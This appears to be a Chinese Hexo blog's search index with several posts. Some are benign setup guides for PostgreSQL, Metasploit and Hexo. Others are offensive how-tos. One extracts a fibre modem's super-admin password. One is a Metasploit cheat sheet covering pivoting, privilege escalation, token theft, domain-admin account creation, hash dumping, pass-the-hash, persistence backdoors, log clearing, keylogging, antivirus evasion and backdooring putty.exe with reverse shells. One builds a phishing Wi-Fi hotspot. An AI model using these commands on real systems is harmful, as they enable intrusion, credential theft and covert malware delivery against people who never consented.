<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[MacOS安装PostgreSQL]]></title>
    <url>%2F2018%2F03%2F09%2FMacOS%E5%AE%89%E8%A3%85PostgreSQL%2F</url>
    <content type="text"><![CDATA[测试环境 macOS Sierra 10.12.6 安装 PostgreSQL1brew install postgresql 配置 PostgreSQL查看版本12➜ ~ pg_ctl -Vpg_ctl (PostgreSQL) 10.3 安装成功之后，安装路径为：/usr/local/var/postgres 初始化数据库1initdb /usr/local/var/postgres 手动启动 PostgreSQL1pg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log start 查看 PostgreSQL 运行状态1pg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log status 手动停止 PostgreSQL1pg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log stop -s -m fast 查看进程1ps auxwww | grep postgres 创建用户和数据库123456#createuser will prompt you for a password, enter it twice.$ createuser -P test$ createdb -Otest -Eutf8 test_db$ psqlpostgres=# GRANT ALL PRIVILEGES ON test TO test;postgres=# \q 进入命令行模式1psql -U test test_db -h localhost -W 错误解决FATAL: Ident authentication failed for user1This is because by default PostgreSQL uses ‘ident’ authentication i.e it checks if the username exists on the system. You need to change authentication mode to ‘trust’ as we do not want to add a system user. Modify the settings in “pg_hba.conf” to use ‘trust’ authentication. 请修改 /usr/local/var/postgres/pg_hba.conf 为： 安装 pgadmin，下载地址：http://www.pgadmin.org/download/macosx.php via：https://yq.aliyun.com/articles/25638]]></content>
      <tags>
        <tag>MacOS</tag>
        <tag>PostgreSQL</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[天翼光猫破解超级管理员账号密码]]></title>
    <url>%2F2018%2F03%2F02%2F%E5%A4%A9%E7%BF%BC%E5%85%89%E7%8C%AB%E7%A0%B4%E8%A7%A3%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[获取密码的步骤 首先去光猫底部看看，你会发现一个普通用户的账号和密码，登录之。 ​ 假设你的光猫IP是 192.168.1.1 访问 http://192.168.1.1/backupsettings.conf 这个连接下载配置文件。 重命名配置文件 backupsettings.conf 为 backupsettings.conf.txt 。 找到类似这样的地方，就是账号和密码： 123&lt;X_CT-COM_TeleComAccount&gt; &lt;Password&gt;telecomadmin88888888&lt;/Password&gt;&lt;/X_CT-COM_TeleComAccount&gt; 其中通用账号是：telecomadmin 密码则是：telecomadmin88888888]]></content>
      <tags>
        <tag>路由器</tag>
        <tag>光猫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MetaSploit内网渗透全技巧]]></title>
    <url>%2F2018%2F03%2F01%2FMetaSploit%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%85%A8%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[技巧汇总内网代理方法一： 123456meterpreter &gt; run get_local_subnets //获取网段meterpreter &gt; run autoroute -s 172.2.175.0/24 //添加路由meterpreter &gt; run autoroute -p //查看路由meterpreter &gt; run autoroute -d -s 172.2.175.0 //删除网段meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。meterpreter &gt; background //后台sessions 方法二： 1234567891011121314meterpreter&gt; run get_local_subnets #查看网段/子网 Local subnet: 192.168.33.0/255.255.255.0 meterpreter&gt; background #转入后台运行 msf&gt; route add 192.168.33.0 255.255.255.0 1 #本地添加路由信息 msf&gt; route print #查看添加的信息 msf&gt; use linux/samba/lsa_transnames_heap #准备向内网目标主机进攻 msf&gt; set payload linux/x86/shell/reverse_tcp msf&gt; set LHOST 10.10.1.129 #此处为attacking 主机的外网IP msf&gt; set LPORT 8080 msf&gt; set RHOST 192.168.33.132 #内网目标主机 msf&gt; exploit 也可以使用自动式添加路由模块： msf&gt; load auto_add_route msf&gt; exploit 权限提升自动化提权： 1meterpreter &gt; getsystem //直getsystem提权，最常用简单的办法 半自动提权： 123456789meterpreter &gt; background //先后台运行会话[*] Backgrounding session 1…msf &gt; use post/windows/escalate/ms10_073_kbdlayoutmsf &gt; show optionsmsf &gt; set session 1 //设置要使用的会话msf post(ms10_073_kbdlayout) &gt; exploit注意：如果创建了一个system进程，就可以立马sessions 1进入会话，然后ps查看进程，使用migrate pid注入到进程。或者直接：meterpreter &gt; run post/windows/escalate/ms10_073_kbdlayout 令牌窃取与模拟当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。 窃取令牌 12345meterpreter &gt; use incognito //进入这个模块meterpreter &gt; list_tokens –u //查看存在的令牌meterpreter &gt; impersonate_token NT AUTXXXX\SYSTEM //令牌是DelegationTokens一列，getuid查看，两个斜杠注：只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌，一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的，建好的账户没有这个权限。使用菜刀（IIS服务器权限）反弹meterpreter是服务型权限。 令牌模拟 123456789meterpreter&gt; ps # 查看目标机器进程，找出域控账户运行的进程ID，假如发现PID 为380 meterpreter&gt; steal_token 380 有时ps 命令列出的进程中可能不存在域控账户的进程，此时使用incognito 模块查看可 用token： meterpreter&gt; use incognito meterpreter&gt; list_tokens –u #列出可用token，假如找到域控token meterpreter&gt; impersonate_token SNEAKS.IN\ihazdomainadmin meterpreter&gt; add_user hacker password –h 192.168.1.50 #在域控主机上添加账户 meterpreter&gt; add_group_user “Domain Admins” hacker –h 192.168.1.50 #将账户添加至域管理员组 ​ BypassUAC1234msf &gt; use exploit/windows/local/bypassuac //32位与64位一样，其他几个模块也一样msf &gt; show optionsmsf &gt; set session 4msf &gt; run //成功后会返回一个新的session，进入新会话，发现权限没变，使用getsystem即可完成提权 HashDump1meterpreter &gt; run post/windows/gather/smart_hashdump //读取hash这种做法最智能，效果最好 64 位win7 下需要管理员权限执行后门且先getsystem，然后使用 run post/windows/gather/hashdump 来dump hash 成功率更高。而且如果要使用shell 添加系统账户的话win7 下得先： 1run post/windows/escalate/bypassuac 不然可能不会成功 权限维持 服务启动后门 123456meterpreter &gt; run metsvc -A //再开起一个终端，进入msfconsolemsf &gt; use exploit/multi/handler //新终端中监听msf &gt; set payload windows/metsvc_bind_tcpmsf &gt; set LPORT 31337msf &gt; set RHOST 192.168.0.128msf &gt; run //获取到的会话是system权限 启动项启动后门 1meterpreter &gt; run persistence -X -i 10 -p 6666 -r 192.168.71.105 -X 系统开机自启，-i 10 10秒重连一次，-p 监听端口，-r 监听机。直接监听就好了，他自己会链接回来。注意到移除 persistence 后门的办法是删除 HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ 中的注册表键和 C:\WINDOWS\TEMP\ 中的 VBScript 文件。 下次连接时： 12345msf&gt; use multi/handler set payload windows/meterpreter/reverse_tcp set LPOST 443 set LHOST 192.168.1.111 exploit 会在以下位置和注册表以随机文件名写入文件等信息，如： 123C:\Users\YourtUserName\AppData\Local\Temp\MXIxVNCy.vbs C:\Users\YourtUserName\AppData\Local\Temp\radF871B.tmp\svchost.exe HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DjMzwzCDaoIcgNP) 缺点：容易被杀毒软件杀 。 弊端：这两个后门有个弊端，在进程中都会存在服务名称为meterpreter的进程 漏洞扫描 端口扫描 123456use auxiliary/scanner/portscan/tcpshow optionsset rhosts 192.168.2.1-255set ports 21,22,25,443,445,1433,3306set threads 20exploit MSSQL开发利用 对各个ip是否有mssql服务的探测 12345use scanner/mssql/mssql_ping //测试MSSQL的存在和信息show optionsset rhosts 192.168.2.1-255set threads 30exploit 对扫描到的IP进行爆破 1234567msf&gt; use auxiliary/scanner/mssql/mssql_login show options set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt set RHOSTS 192.168.1.130 set THREADS 10 set verbose false exploit sa权限对其利用 12345use admin/mssql/mssql_execset rhost 192.168.2.10set password saset CMD cmd.exe /c echo helloexploit 使用MSSQL自带的 xp_cmdshell 添加账户12345678msf&gt; use exploit/windows/mssql/mssql_payload show options set payload windows/meterpreter/reverse_tcp set LHOST 192.168.1.111 set LPORT 433 set RHOST 192.168.1.130 set PASSWORD password130 exploit MySQL开放利用 1待完善 ​ 爆破ssh模块 123456use auxiliary/scanner/ssh/ssh_loginset rhosts 7.7.7.20set username rootset pass_file /root/pass.txt //加载字典，可以收集密码做字典set threads 50run 通过nmap扫描基本漏洞 12msf &gt; nmap –script=vuln 受害靶机ip地址msf &gt; nmap –script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版本 等.. ###清除痕迹 1msf &gt; clearev //删除目标机上的应用程序、系统和安全日志。 读取系统账号密码 加载mimikatz 12meterpreter &gt; load mimikatz //加载mimikatz模块meterpreter &gt; wdigest //需要system权限 读取Hash并使用smb协议登录 12meterpreter&gt; use priv meterpreter&gt; run post/windows/gather/hashdump 当获取到密码的hash 之后无法破解出明文密码且无法直接使用hash 登陆，需要使用 pass-the-hash 技术： 1234567msf&gt; use windows/smb/psexec set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 192.168.1.111 set LPORT 443 set RHOST 192.168.1.130 set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29 exploit 获取到系统权限后我们可以新建一个普通账号，然后使用此账号执行我们的后门：在目标机器上执行： 1net user hacker p@ssw0rd /add 本地生成一个后门程序： 1msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=443 X &gt; payload.exe 将payload.exe 拷贝到目标机器然后使用新建立的账号执行本地执行端口监听，等待来自目标机器连接： 12345msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=443 use priv getsystem getuid 至此取得SYSTEM 权限 键盘记录1meterpreter&gt; run post/windows/capture/keylog_recorder //运行键盘记录模块，他自己创建本文。 /root/.msf3/loot/*.txt #查看结果 进程权限迁移当攻击成功后将连接进程从不稳定进程（如使用浏览器溢出漏洞exp 进行攻击时浏览器可能会被目标关闭）迁移至稳定进程(explorer.exe)，保持可连接。 1meterpreter&gt; run post/windows/manage/migrate 在64 位win7 中migrate 需要管理员权限执行后门才能成功，而migrate 前后获取的权限是有差异的。 关闭杀毒软件1meterpreter&gt; run killav （这个脚本要小心使用，可能导致目标机器蓝屏死机。） 获取系统流量1meterpreter&gt; run packtrecorder –i 1 获取目标网络共享1meterpreter&gt; run scraper 从目标主机获得所有网络共享等信息。并且获得的这些所有这些信息都存储在 /root/.msf4/logs/scripts/scraper/directory 目录下。使用 ls 命令查看存储的这些文件。 VNC远程界面控制 VNC控制命令 12meterpreter&gt; run vnc meterpreter&gt; run screen_unlock Windows API编程 , Hello World弹窗使用Railgun 操作windows APIs 1234meterpreter &gt; irb[*] Starting IRB shell[*] The &apos;client&apos; variable holds the meterpreter client&gt;&gt; client.railgun.user32.MessageBoxA(0,&quot;Hello World&quot;,&quot;Im Title&quot;,&quot;MB_OK&quot;) 编码绕过杀软1msfencode –l #列出可用编码器 简单编码： 1msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |msfencode –e x86/shikata_ga_nai –t exe &gt; /var/www/payload2.exe 使用R 参数作为raw 输出至管道，再经过msfencode 处理，最后导出。 多次编码： 1234msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R | msfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/alpha_upper –c 2 –t raw | msfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/countdown –c 5 –t exe –o /var/www/payload3.exe 简单编码被杀机会很大，使用多次编码效果更好，这里一共使用了17 次循环编码。 题外： 经测试 &gt;&gt;&gt; 1：使用此命令生成的后门也被MSE 杀到； 2：未编码的后门或编码次数较少的后门可以直接被秒杀； 3：windows/x64/meterpreter/reverse_tcp 生成的后门未经任何处理仍然不被杀，看来杀毒软件傻逼了； 4：x86 编码器编码的后门在64 位机器上无法执行； 5：360 有个沙箱功能，后门文件右键选择“在360 隔离沙箱中运行”，msf照样可以连接并操作，看来隔离沙箱功能有限。） 自定义可执行程序模板msfencode 默认使用data/templates/templates.exe（msf v4 在templates 目录下有针对不同平台的不同模板）作为可执行程序的模板，杀毒厂商也不是傻逼，所以这里最好使用自定义模板，如： 123456wget &lt;http://download.sysinternals.com/Files/ProcessExplorer.zip&gt; cd work unzip ProcessExplorer.zip cd .. msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode –t exe –x work/procexp.exe –o /var/www/pe_backdoor.exe –e x86/shikata_ga_nai –c 5 在目标机器上运行，然后本地使用msfcli 监听端口等待反弹连接： 12msfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 E 暗度陈仓—猥琐执行payload (绑定到可执行文件)绑定payload 至一个可执行文件，让目标不知不觉间中招，以putty.exe 为例： 12msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode –t exe –x putty.exe -o /var/www/putty_backdoor.exe –e x86/shikata_ga_nai –k –c 5 假如选择一个GUI 界面的程序作为绑定目标并且不使用-k 选项，则目标执行此程序的时候不会弹出cmd 窗口，-k 选项的作用是payload 独立于模板软件的进程运行。 常用渗透手段扫描匿名FTP1234use auxiliary/scanner/ftp/anonymos set RHOSTS 192.168.1.0/24 set THREADS 50 run 与nessus 结合扫描使用Nessus 扫描完成后生成.nessus 格式的报告，导入到MSF： 1234db_connect postgres:toor@127.0.0.1/msf db_import /tmp/nessus_report_Host_test.nessus db_hosts –c address,svcs,vulns db_vulns 在MSF 中使用Nessus： 123456789db_connect postgres:toor@127.0.0.1/msf load nessus nessus_connect nessus:toor@192.168.1.111:8834 ok nessus_policy_list #查看存在的扫描规则 nessus_scan_new 2 bridge_scan 192.168.1.111 #2 表示规则的ID 号，bridge_scan 自定义扫描名称 nessus_scan_status #查看扫描进行状态 nessus_report_list #查看扫描结果 nessus_report_get skjla243-3b5d-* #导入报告 db_hosts –c address,svcs,vulns SMB弱口令扫描12345msf&gt; use auxiliary/scanner/smb/smb_login set RHOSTS 192.168.1.111-222 set SMBUser Administrator set SMBPass admin run VNC空口令扫描123msf&gt; use auxiliary/scanner/vnc/vnc_none_auth set RHOSTS 192.168.1.111 run Open X11空口令1234msf&gt; use auxiliary/scanner/x11/open_x11 set RHOST 192.168.1.0/24 set THREADS 50 run Msf自动化测试(一行命令执行)为了缩短渗透测试的时间可以将 Msf 命令写入一个文件，然后使用 msfconsole 加载执行。 加载方式：msfconsole 的resource 命令或者msfconsole 加上-r 选项 例如： 123echo ‘version’ &gt; resource.rc echo ‘load sounds’ &gt;&gt; resource.rc msfconsole –r resource.rc 例如： 1234567echo ‘use exploit/windows/smb/ms08_067_netapi’ &gt; autoexp.rc echo ‘set RHOST 192.168.1.133’ &gt;&gt; autoexp.rc echo ‘set PAYLOAD windows/meterpreter/reverse_tcp’ &gt;&gt; autoexp.rc echo ‘set LHOST 192.168.1.111’ &gt;&gt; autoexp.rc echo ‘exploit’ &gt;&gt; autoexp.rc msfconsole msf&gt; resource autoexp.rc]]></content>
      <categories>
        <category>MetaSploit教程</category>
      </categories>
      <tags>
        <tag>MetaSploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派创建钓鱼WiFi实战全过程]]></title>
    <url>%2F2018%2F02%2F23%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9B%E5%BB%BA%E9%92%93%E9%B1%BCWiFi%E5%AE%9E%E6%88%98%E5%85%A8%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[测试环境 攻击机：树莓派3代 B kali 2.0 armhf 免驱无线网卡 受害机：MacBook MacOS Sierra 10.12.6 ​ 环境搭建####安装必要工具 1sudo apt-get install hostapd dnsmasq 安装 nodejs , 你可以直接执行 1sudo apt-get install nodejs 当安装上面命令安装失败时尝试下面方法： 访问 官方下载页面 ，找到Source Code源码包下载地址 依次执行进行 下载、解包、编译、安装。 1234567&gt;wget https://nodejs.org/dist/v8.9.4/node-v8.9.4.tar.gz&gt;tar zxvf node-v8.9.4.tar.gz&gt;cd node-v9.6.1&gt;./configure&gt;make&gt;make install &gt; 下载 Closurether 神器 1git clone https://github.com/LFODER/closurether.git 通过 git 克隆到本地，开始运行 这里还要安装一个神器 Closurether 未完待续 修改 hostapd 配置文件安装好后，分别来修改配置文件，首先修改 hostapd的配置文件 1sudo vim /etc/hostapd/hostapd.conf 查找并修改以下内容： 1234567891011# 你即将建立热点的无线网卡名字 可以用 ifconfig 或者 iw list 查看interface=wlan1# 无线网卡驱动driver=nl80211# 热点名字ssid=RaspberryPihw_mode=gchannel=11# auth_alg 设置为1 表示开放网络 具体你可以选择 百度一下这个字段auth_alg=1wmm_enabled=0 当然你也可以设置 加密 的WiFi热点，具体配置方法，请 参考这里 。 修改 dnsmasq 配置文件接下来修改 dnsmasq 的配置： 1sudo vim /etc/dnsmasq.conf 找到修改或添加以下内容: 1234567891011121314# 你即将建立热点的无线网卡名字 可以用 ifconfig 或 iw list 查看interface=wlan1# DNSlisten-address=192.168.22.1bind-interface# 设置你的热点可分配IP范围和租用周期。dhcp-range=192.168.22.2,192.168.22.254,12h# 设置子网掩码dhcp-option=1,255.255.255.0# 3是网关 6具体是什么意思 忘记了 我只记得又一个是DNS配置 具体需要查阅资料dhcp-option=3,192.168.22.1dhcp-option=6,192.168.22.1# 所有连接上热点的客户端 所有流量全解析到 192.168.22.1 address=/#/192.168.22.1 关于 dnsmasq 相关推荐： 通过Dnsmasq自建干净的DNS服务 DNS非标准端口设置问题 设置 IPv4 转发 设置 IPv4 转发，通过修改文件配置来打开 IPv4 转发。 1sudo vim /etc/sysctl.conf 找到 net.ipv4.ip_forward=1，去掉注释符号，使其生效。 但是这样设置，需要在下次重启后才会生效，如果不想重启直接执行下面命令即可： 1sudo sh -c "echo 1 &gt;/proc/sys/net/ipv4/ip_forward" 修改防火墙设置我这里是将以太网 eth0 接口共享给树莓派外接网卡 wlan1 接口上网，需要配置NAT，需要先对防火墙进行操作： 123sudo iptables -t nat -APOSTROUTING -o eth0 -j MASQUERADEsudo iptables -A FORWARD -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPTsudo iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT 当然如果不想每次都设置，可以使用以下命令设置为开机自启动： 1sudo sh -c "iptables-save&gt; /etc/iptables.ipv4.nat" 启动钓鱼热点这里给出一个 bash 脚本，作用很简单， 开启和关闭钓鱼热点，保存文件到任何目录 假设你存储的文件名为 apapap.sh 123456789101112131415161718192021222324252627#! /bin/bashcase $1 in "start") sleep 1 ifconfig wlan1 192.168.22.1 netmask 255.255.255.0 sleep 1 echo "1" &gt;/proc/sys/net/ipv4/ip_forward sleep 1 iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sleep 1 /etc/init.d/hostapd start sleep 1 /etc/init.d/dnsmasq start ;; "stop") /etc/init.d/dnsmasq stop /etc/init.d/hostapd stop sleep 1 iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE sleep 1 echo "0" &gt;/proc/sys/net/ipv4/ip_forward sleep 1 ;; *) echo "Usage $0 &#123;start|stop&#125;" ;; esac 首先要给文件执行权限： 1sudo chmod 755 apapap.sh 然后执行 1./apapap.sh 正常会出现： 123root@kali:~# ./apapap.sh Usage ./apapap.sh &#123;start|stop&#125;root@kali:~# 用法一目了然，看看正常启动的状态。 1234root@kali:~# ./apapap.sh start[ ok ] Starting hostapd (via systemctl): hostapd.service.[ ok ] Starting dnsmasq (via systemctl): dnsmasq.service.root@kali:~# 不出意外的话，执行完成了就是这样，此时你去查看Wifi热点，看是否成功开启了。 已经开启了热点，现在连入wifi的所有客户端浏览都经过树莓派网卡。 一些😈邪恶的玩法 ，请参考这里：http://www.freebuf.com/articles/web/43353.html]]></content>
      <tags>
        <tag>钓鱼WiFi</tag>
        <tag>中间人劫持</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MacOS安装Metasploit全攻略]]></title>
    <url>%2F2018%2F02%2F22%2FMacOS%E5%AE%89%E8%A3%85Metasploit%E5%85%A8%E6%94%BB%E7%95%A5%2F</url>
    <content type="text"><![CDATA[测试环境 系 统: MacOS Sierra 10.12.6 下载MetaSploit官方最新版MetaSploit Framework 最新版 下载地址 下载完成，双击安装。此时终端输入 msfconsole 提示找不到，是因为环境变量没有设置。 添加环境变量正常的方法是: 1vim /etc/profile 然后添加 1export PATH="/opt/metasploit-framework/bin:$PATH" 使环境变量立刻生效 1source /etc/profile 如果你使用的是 zsh 那么则是下面的方法: 1vim ~/.zshrc 然后添加 1export PATH="/opt/metasploit-framework/bin:$PATH" 使环境变量立刻生效 1source ~/.zshrc 运行与更新终端输入 msf 并按 Tab 键，看是否能出现 1234➜ ~ msfmsfbinscan msfdb msfpescan msfrpc msfvenom msfconsole msfelfscan msfremove msfrpcd msfd msfmachscan msfrop msfupdate 若出现上面结果，代表环境变量已经生效。 接下来更新Metasploit： 终端执行 msfupdate OK 各种问题和解决方案搜索攻击模块时出现模块换成数据库不能建立，使用慢搜索模式现象： 1[!] Module database cache not built yet, using slow search 解决方案: 1msf &gt; db_rebuild_cache 没有连接上数据库现象： 1234msf &gt; db_rebuild_cache [-] The database is not connectedmsf &gt; db_status [*] postgresql selected, no connection 解决方案： 12 Postgresql 服务没有启动现象： 1234➜ ~ msfconsole [-] Failed to connect to the database: could not connect to server: Connection refused Is the server running on host "127.0.0.1" and accepting TCP/IP connections on port 5433? 解决方案：]]></content>
      <categories>
        <category>MetaSploit教程</category>
      </categories>
      <tags>
        <tag>MetaSploit</tag>
        <tag>MacOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo博客调教日记]]></title>
    <url>%2F2018%2F02%2F21%2FHexo%E5%8D%9A%E5%AE%A2%E8%B0%83%E6%95%99%E6%97%A5%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Hexo 安装与配置Hexo安装 自行百度 | 官方文档 测试环境 操作系统: MacOS Sierra 10.12.6博客主题: next 启动搜索功能首先到博客根目录(这里指你 Hexo init 后的博客目录)执行:1npm install hexo-generator-search --save 然后到你的主题目录下修改 _config.yml 文件我使用的是Next主题，进入博客根目录，找到 themes/next/_config.yml 文件，搜索 local_search:会看到如下内容：1234567891011# Local search# Dependencies: https://github.com/theme-next/hexo-generator-searchdblocal_search: enable: false # if auto, trigger search by changing input # if manual, trigger search by pressing enter key or search button trigger: auto # show top n results per article, show all results by setting to -1 top_n_per_article: 1 # unescape html strings to the readable one unescape: false 将 enable: false 改成 enable: true 即可启用本地搜索功能。然后在 themes/next/_config.yml 文件中添加:123456# Searchsearch: path: search.xml field: post format: html limit: 10000 启用本地图片博客中往往会频繁使用到图片，外链图片到博客最简单的方法就是1!(图片描述 可选)[图片链接] 但是往往去找一个靠谱的图床是一件很头疼的事情，如果你的服务器带宽够大，可以选择使用本地图片，开启本地图片的方法:首先进入博客根目录，编辑 _config.yml 文件，找到 post_asset_folder:false 修改为 post_asset_folder:true然后在博客根目录执行1npm install https://github.com/CodeFalling/hexo-asset-image --save 此时你使用 hexo new &quot;一篇博客&quot; 的时候，会在博客根目录下 source/_posts/ 下创建与博客同名的文件夹用于存放本地图片，方便在博客中调用。博客调用本地图片时如下:1![“图片描述”（可以不写）](/文件夹名/你的图片名字.JPG) 插入音乐例如网易云，直接获取播放器外链，iframe代码直接写到Blog中即可。 启用分类页首先执行:1hexo new page &quot;categories&quot; 新建一个页面为 categories 的分类页面，然后会自动在博客根目录下的 source/_posts/ 生成一个 categories 的目录，里面有一个 index.md打开看看内容如下：1234---title: &quot;categories&quot;date: 2018-02-22 11:44:07--- 修改成如下123456---title: 文章分类date: 2018-02-22 11:44:07type: &quot;categories&quot;comments: false--- 这里就是需要添加一个 type 字段，类型值为 categories 如果启用过 多说 或者是 Disqus 等评论插件，默认页面也会带评论，需要关闭则添加 comments 字段，并设置值为 false 进入博客根目录 ，找到 themes/next/_config.yml ，找到主题配置文件，修改其 menu 标签。12345menu: home: / || home tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive 这里把 categories 标签前面的注释 # 去掉即可。 启用标签页首先执行:1hexo new page &quot;tags&quot; 新建一个页面为 tags 的标签云页面，然后会自动在博客根目录下的 source/_posts/ 生成一个 tags 的目录，里面有一个 index.md打开看看内容如下：1234---title: &quot;tags&quot;date: 2018-02-22 11:44:07--- 修改成如下123456---title: 标签云date: 2018-02-22 11:44:07type: &quot;tags&quot;comments: false--- 这里就是需要添加一个 type 字段，类型值为 tags 如果启用过 多说 或者是 Disqus 等评论插件，默认页面也会带评论，需要关闭则添加 comments 字段，并设置值为 false 进入博客根目录 ，找到 themes/next/_config.yml ，找到主题配置文件，修改其 menu 标签。12345menu: home: / || home tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive 这里把 tags 标签前面的注释 # 去掉即可。 博客中添加标签的方法在 source/_posts 中找到你创建的博客，编辑头部内容，格式如下:123456789---title: Hexo博客调教日记date: 2018-02-21 17:16:03categories: &quot;Hexo教程&quot;tags: - Hexo - Nextdescription: 记录自己安装与使用Hexo时踩过的坑与解决方法--- 当然 tags 标签也可以这么写12345---... (此处省略前后文)tags: [Hexo,Next]...--- categories 字段为分类，description 字段为描述。 标签删除的方法理论上在 MD 文件的头部可以删除标签 然后重新生成可以更新 tags 标签页如果无法成功删除的时候，可以尝试下面的方法:删除根目录的 db.json 然后 hexo clean &amp;&amp; hexo g 各种坑和解决方法导航解析错误 问题描述: 你发现你写的MD格式都是正常的，但是发现Next自动解析的导航，却不合人意，甚至你可以发现正文的代码段混乱什么的情况 解决方法: 找找全文代码段中的用来划分代码段用的三个点末尾是否出现空格，删除之，解决。 ERROR Deployer not found: git 问题描述: 在执行 hexo d 的时候，出现 ERROR Deployer not found: git错误 解决方案: 进入博客根目录，执行：1npm install hexo-deployer-git --save]]></content>
      <categories>
        <category>Hexo教程</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo的next主题个性化教程:打造炫酷网站]]></title>
    <url>%2F2018%2F02%2F02%2FHexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E6%95%99%E7%A8%8B-%E6%89%93%E9%80%A0%E7%82%AB%E9%85%B7%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[via: https://www.jianshu.com/p/f054333ac9e6]]></content>
      <categories>
        <category>Hexo教程</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
